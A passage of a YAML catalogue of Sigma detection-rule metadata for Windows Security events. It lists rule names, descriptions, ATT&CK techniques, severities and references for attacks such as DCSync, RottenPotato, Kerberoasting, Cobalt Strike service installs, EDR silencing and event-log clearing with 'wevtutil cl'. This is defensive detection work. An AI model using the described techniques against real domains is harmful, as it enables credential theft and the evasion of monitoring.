  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_susp_rottenpotato.yml
  name: RottenPotato Like Attack Pattern
  description: Detects logon events that have characteristics of events generated
    during an attack with RottenPotato and the like
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1557.001
  tags:
  - attack.collection
  - attack.privilege-escalation
  - attack.credential-access
  - attack.t1557.001
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1195284233729777665
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5af54681-df95-4c26-854f-2565e13cfab0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/account_management/win_security_susp_wmi_login.yml
  name: Successful Account Login Via WMI
  description: Detects successful logon attempts performed with WMI
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Monitoring tools
  - Legitimate system administration
  notes: ''
- detection_id: bacf58c6-e199-4040-a94f-95dea0f1e45a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/object_access/win_security_wfp_endpoint_agent_blocked.yml
  name: Windows Filtering Platform Blocked Connection From EDR Agent Binary
  description: 'Detects a Windows Filtering Platform (WFP) blocked connection event
    involving common Endpoint Detection and Response (EDR) agents.

    Adversaries may use WFP filters to prevent Endpoint Detection and Response (EDR)
    agents from reporting security events.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://github.com/netero1010/EDRSilencer
  - https://github.com/amjcyber/EDRNoiseMaker
  - https://ghoulsec.medium.com/misc-series-4-forensics-on-edrsilencer-events-428b20b3f983
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ff151c33-45fa-475d-af4f-c2f93571f4fe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_aadhealth_mon_agent_regkey_access.yml
  name: Azure AD Health Monitoring Agent Registry Keys Access
  description: 'This detection uses Windows security events to detect suspicious access
    attempts to the registry key of Azure AD Health monitoring agent.

    This detection requires an access control entry (ACE) on the system access control
    list (SACL) of the following securable object HKLM\SOFTWARE\Microsoft\Microsoft
    Online\Reporting\MonitoringAgent.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1012
  tags:
  - attack.discovery
  - attack.t1012
  time_window: ''
  references:
  - https://o365blog.com/post/hybridhealthagent/
  - https://github.com/OTRF/Set-AuditRule/blob/c3dec5443414231714d850565d364ca73475ade5/rules/registry/aad_connect_health_monitoring_agent.yml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1d2ab8ac-1a01-423b-9c39-001510eae8e8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_aadhealth_svc_agent_regkey_access.yml
  name: Azure AD Health Service Agents Registry Keys Access
  description: 'This detection uses Windows security events to detect suspicious access
    attempts to the registry key values and sub-keys of Azure AD Health service agents
    (e.g AD FS).

    Information from AD Health service agents can be used to potentially abuse some
    of the features provided by those services in the cloud (e.g. Federation).

    This detection requires an access control entry (ACE) on the system access control
    list (SACL) of the following securable object: HKLM:\SOFTWARE\Microsoft\ADHealthAgent.

    Make sure you set the SACL to propagate to its sub-keys.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1012
  tags:
  - attack.discovery
  - attack.t1012
  time_window: ''
  references:
  - https://o365blog.com/post/hybridhealthagent/
  - https://github.com/OTRF/Set-AuditRule/blob/c3dec5443414231714d850565d364ca73475ade5/rules/registry/aad_connect_health_service_agent.yml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2c99737c-585d-4431-b61a-c911d86ff32f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_account_backdoor_dcsync_rights.yml
  name: Powerview Add-DomainObjectAcl DCSync AD Extend Right
  description: Backdooring domain object to grant the rights associated with DCSync
    to a regular user or machine account using Powerview\Add-DomainObjectAcl DCSync
    Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://twitter.com/menasec1/status/1111556090137903104
  - https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf
  false_positives:
  - New Domain Controller computer account, check user SIDs within the value attribute
    of event 5136 and verify if it's a regular user or DC computer account.
  notes: ''
- detection_id: 35ba1d85-724d-42a3-889f-2e2362bcaf23
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_account_discovery.yml
  name: AD Privileged Users or Groups Reconnaissance
  description: Detect priv users or groups recon based on 4661 eventid and known privileged
    users or groups SIDs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1087.002
  time_window: ''
  references:
  - https://web.archive.org/web/20230329163438/https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html
  false_positives:
  - If source account name is not an admin then its super suspicious
  notes: ''
- detection_id: 028c7842-4243-41cd-be6f-12f3cf1a26c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_ad_object_writedac_access.yml
  name: AD Object WriteDAC Access
  description: Detects WRITE_DAC access to a domain object
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1222.001
  tags:
  - attack.defense-evasion
  - attack.t1222.001
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/180815-ADObjectAccessReplication/notebook.html
  - https://threathunterplaybook.com/library/windows/active_directory_replication.html
  - https://threathunterplaybook.com/hunts/windows/190101-ADModDirectoryReplication/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 17d619c1-e020-4347-957e-1d1207455c93
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_ad_replication_non_machine_account.yml
  name: Active Directory Replication from Non Machine Account
  description: Detects potential abuse of Active Directory Replication Service (ADRS)
    from a non machine account to request credentials.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.006
  tags:
  - attack.credential-access
  - attack.t1003.006
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/180815-ADObjectAccessReplication/notebook.html
  - https://threathunterplaybook.com/library/windows/active_directory_replication.html
  - https://threathunterplaybook.com/hunts/windows/190101-ADModDirectoryReplication/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: ab6bffca-beff-4baa-af11-6733f296d57a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_ad_user_enumeration.yml
  name: Potential AD User Enumeration From Non-Machine Account
  description: Detects read access to a domain user from a non-machine account
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1087.002
  time_window: ''
  references:
  - https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf
  - http://www.stuffithoughtiknew.com/2019/02/detecting-bloodhound.html
  - https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4662
  false_positives:
  - Administrators configuring new users.
  notes: ''
- detection_id: 5ee3a654-372f-11ec-8d3d-0242ac130003
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_adcs_certificate_template_configuration_vulnerability.yml
  name: ADCS Certificate Template Configuration Vulnerability
  description: Detects certificate creation with template allowing risk permission
    subject
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  time_window: ''
  references:
  - https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
  false_positives:
  - Administrator activity
  - Proxy SSL certificate with subject modification
  - Smart card enrollement
  notes: ''
- detection_id: bfbd3291-de87-4b7c-88a2-d6a5deb28668
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_adcs_certificate_template_configuration_vulnerability_eku.yml
  name: ADCS Certificate Template Configuration Vulnerability with Risky EKU
  description: Detects certificate creation with template allowing risk permission
    subject and risky EKU
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  time_window: ''
  references:
  - https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
  false_positives:
  - Administrator activity
  - Proxy SSL certificate with subject modification
  - Smart card enrollement
  notes: ''
- detection_id: 20d96d95-5a20-4cf1-a483-f3bda8a7c037
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_add_remove_computer.yml
  name: Add or Remove Computer from DC
  description: Detects the creation or removal of a computer. Can be used to detect
    attacks such as DCShadow via the creation of a new SPN.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1207
  tags:
  - attack.defense-evasion
  - attack.t1207
  time_window: ''
  references:
  - https://github.com/Yamato-Security/EnableWindowsLogSettings/blob/7f6d755d45ac7cc9fc35b0cbf498e6aa4ef19def/ConfiguringSecurityLogAuditPolicies.md
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4741
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4743
  false_positives:
  - Unknown
  notes: ''
- detection_id: 098d7118-55bc-4912-a836-dc6483a8d150
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_admin_share_access.yml
  name: Access To ADMIN$ Network Share
  description: Detects access to ADMIN$ network share
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: 311b6ce2-7890-4383-a8c2-663a9f6b43cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_alert_active_directory_user_control.yml
  name: Enabled User Right in AD to Control User Objects
  description: Detects scenario where if a user is assigned the SeEnableDelegationPrivilege
    right in Active Directory it would allow control of other AD user objects.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 300bac00-e041-4ee2-9c36-e262656a6ecc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_alert_ad_user_backdoors.yml
  name: Active Directory User Backdoors
  description: Detects scenarios where one can control another users or computers
    account without having to use their credentials.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.t1098
  - attack.persistence
  time_window: ''
  references:
  - https://msdn.microsoft.com/en-us/library/cc220234.aspx
  - https://adsecurity.org/?p=3466
  - https://blog.harmj0y.net/redteaming/another-word-on-delegation/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f6de9536-0441-4b3f-a646-f4e00f300ffd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_alert_enable_weak_encryption.yml
  name: Weak Encryption Enabled and Kerberoast
  description: Detects scenario where weak encryption is enabled for a user profile
    which could be used for hash/password cracking.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://adsecurity.org/?p=2053
  - https://blog.harmj0y.net/redteaming/another-word-on-delegation/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 24549159-ac1b-479c-8175-d42aea947cae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_alert_ruler.yml
  name: Hacktool Ruler
  description: This events that are generated when using the hacktool Ruler by Sensepost
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Discovery
  - Execution
  techniques:
  - T1059
  - T1087
  - T1114
  - T1550.002
  tags:
  - attack.defense-evasion
  - attack.discovery
  - attack.execution
  - attack.collection
  - attack.lateral-movement
  - attack.t1087
  - attack.t1114
  - attack.t1059
  - attack.t1550.002
  time_window: ''
  references:
  - https://github.com/sensepost/ruler
  - https://github.com/sensepost/ruler/issues/47
  - https://github.com/staaldraad/go-ntlm/blob/cd032d41aa8ce5751c07cb7945400c0f5c81e2eb/ntlm/ntlmv1.go#L427
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4776
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624
  false_positives:
  - Go utilities that use staaldraad awesome NTLM library
  notes: ''
- detection_id: f6de6525-4509-495a-8a82-1f8b0ed73a00
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_atsvc_task.yml
  name: Remote Task Creation via ATSVC Named Pipe
  description: Detects remote task creation via at.exe or API interacting with ATSVC
    namedpipe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.002
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.lateral-movement
  - attack.persistence
  - car.2013-05-004
  - car.2015-04-001
  - attack.t1053.002
  time_window: ''
  references:
  - https://web.archive.org/web/20230409194125/https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: d99b79d2-0a6f-4f46-ad8b-260b6e17f982
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_audit_log_cleared.yml
  name: Security Eventlog Cleared
  description: One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil
    cl" command execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.001
  tags:
  - attack.defense-evasion
  - attack.t1070.001
  - car.2016-04-002
  time_window: ''
  references:
  - https://twitter.com/deviouspolack/status/832535435960209408
  - https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100
  - https://github.com/Azure/Azure-Sentinel/blob/f99542b94afe0ad2f19a82cc08262e7ac8e1428e/Detections/SecurityEvent/SecurityEventLogCleared.yaml
  false_positives:
  - Rollout of log collection agents (the setup routine often includes a reset of
    the local Eventlog)
  - System provisioning (system reset before the golden image creation)
  notes: ''
- detection_id: 8cd538a4-62d5-4e83-810b-12d41e428d6e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_camera_microphone_access.yml
  name: Processes Accessing the Microphone and Webcam
  description: Potential adversaries accessing the microphone and webcam in an endpoint.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1123
  tags:
  - attack.collection
  - attack.t1123
  time_window: ''
  references:
  - https://twitter.com/duzvik/status/1269671601852813320
  - https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072
  false_positives:
  - Unknown
  notes: ''
- detection_id: d7a95147-145f-4678-b85d-d1ff4a3bb3f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_cobaltstrike_service_installs.yml
  name: CobaltStrike Service Installations - Security
  description: Detects known malicious service installs that appear in cases in which
    a Cobalt Strike beacon elevates privileges or lateral movement
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1021.002
  - T1543.003
  - T1569.002
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1543.003
  - attack.t1569.002
  time_window: ''
  references:
  - https://www.sans.org/webcasts/119395
  - https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/
  - https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 470ec5fa-7b4e-4071-b200-4c753100f49b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_codeintegrity_check_failure.yml
  name: Failed Code Integrity Checks
  description: 'Detects code integrity failures such as missing page hashes or corrupted
    drivers due unauthorized modification. This could be a sign of tampered binaries.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: informational
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027.001
  tags:
  - attack.defense-evasion
  - attack.t1027.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5038
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-6281
  false_positives:
  - Disk device errors
  notes: ''
- detection_id: 214e8f95-100a-4e04-bb31-ef6cba8ce07e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_dce_rpc_smb_spoolss_named_pipe.yml
  name: DCERPC SMB Spoolss Named Pipe
  description: Detects the use of the spoolss named pipe over SMB. This can be used
    to trigger the authentication via NTLM of any machine that has the spoolservice
    enabled.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
  - https://dirkjanm.io/a-different-way-of-abusing-zerologon/
  - https://twitter.com/_dirkjan/status/1309214379003588608
  false_positives:
  - Domain Controllers acting as printer servers too? :)
  notes: ''
- detection_id: c39f0c81-7348-4965-ab27-2fde35a1b641
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_dcom_iertutil_dll_hijack.yml
  name: DCOM InternetExplorer.Application Iertutil DLL Hijack - Security
  description: Detects a threat actor creating a file named `iertutil.dll` in the
    `C:\Program Files\Internet Explorer\` directory over the network for a DCOM InternetExplorer
    DLL Hijack scenario.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  - T1021.003
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1021.003
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/201009-RemoteDCOMIErtUtilDLLHijack/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 611eab06-a145-4dfa-a295-3ccc5c20f59a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_dcsync.yml
  name: Mimikatz DC Sync
  description: Detects Mimikatz DC sync security events
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.006
  tags:
  - attack.credential-access
  - attack.s0002
  - attack.t1003.006
  time_window: ''
  references:
  - https://twitter.com/gentilkiwi/status/1003236624925413376
  - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2
  - https://blog.blacklanternsecurity.com/p/detecting-dcsync?s=r
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4662
  false_positives:
  - Valid DC Sync that is not covered by the filters; please report
  - Local Domain Admin account used for Azure AD Connect
  notes: ''
- detection_id: e5ac86dd-2da1-454b-be74-05d26c769d7d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_default_domain_gpo_modification.yml
  name: Windows Default Domain GPO Modification
  description: 'Detects modifications to Default Domain or Default Domain Controllers
    Group Policy Objects (GPOs).

    Adversaries may modify these default GPOs to deploy malicious configurations across
    the domain.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: experimental
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1484.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/25/i/unmasking-the-gentlemen-ransomware.html
  - https://adsecurity.org/?p=3377
  - https://www.pentestpartners.com/security-blog/living-off-the-land-gpo-style/
  - https://jgspiers.com/audit-group-policy-changes/
  false_positives:
  - Legitimate modifications to Default Domain or Default Domain Controllers GPOs
  notes: ''
- detection_id: c9eb55c3-b468-40ab-9089-db2862e42137
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_device_installation_blocked.yml
  name: Device Installation Blocked
  description: Detects an installation of a device that is forbidden by the system
    policy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1200
  tags:
  - attack.initial-access
  - attack.t1200
  time_window: ''
  references:
  - https://github.com/Yamato-Security/EnableWindowsLogSettings/blob/7f6d755d45ac7cc9fc35b0cbf498e6aa4ef19def/ConfiguringSecurityLogAuditPolicies.md
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-6423
  false_positives:
  - Unknown
  notes: ''
- detection_id: 69aeb277-f15f-4d2d-b32a-55e883609563
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_disable_event_auditing.yml
  name: Windows Event Auditing Disabled
  description: 'Detects scenarios where system auditing (i.e.: Windows event log auditing)
    is disabled.

    This may be used in a scenario where an entity would want to bypass local logging
    to evade detection when Windows event logging is enabled and reviewed.

    Also, it is recommended to turn off "Local Group Policy Object Processing" via
    GPO, which will make sure that Active Directory GPOs take precedence over local/edited
    computer policies via something such as "gpedit.msc".

    Please note, that disabling "Local Group Policy Object Processing" may cause an
    issue in scenarios of one off specific GPO modifications - however, it is recommended
    to perform these modifications in Active Directory anyways.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://docs.google.com/presentation/d/1dkrldTTlN3La-OjWtkWJBb4hVk6vfsSMBFBERs6R8zA/edit
  false_positives:
  - Unknown
  notes: ''
- detection_id: ab4561b1-6c7e-48a7-ad08-087cfb9ce8f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_disable_event_auditing_critical.yml
  name: Important Windows Event Auditing Disabled
  description: Detects scenarios where system auditing for important events such as
    "Process Creation" or "Logon" events is disabled.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://docs.google.com/presentation/d/1dkrldTTlN3La-OjWtkWJBb4hVk6vfsSMBFBERs6R8zA/edit
  - https://github.com/SigmaHQ/sigma/blob/ad1bfd3d28aa0ccc9656240f845022518ef65a2e/documentation/logsource-guides/windows/service/security.md
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a4c90ea1-2634-4ca0-adbb-35eae169b6fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_dot_net_etw_tamper.yml
  name: ETW Logging Disabled In .NET Processes - Registry
  description: Potential adversaries stopping ETW providers recording loaded .NET
    assemblies.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - attack.t1562
  time_window: ''
  references:
  - https://twitter.com/_xpn_/status/1268712093928378368
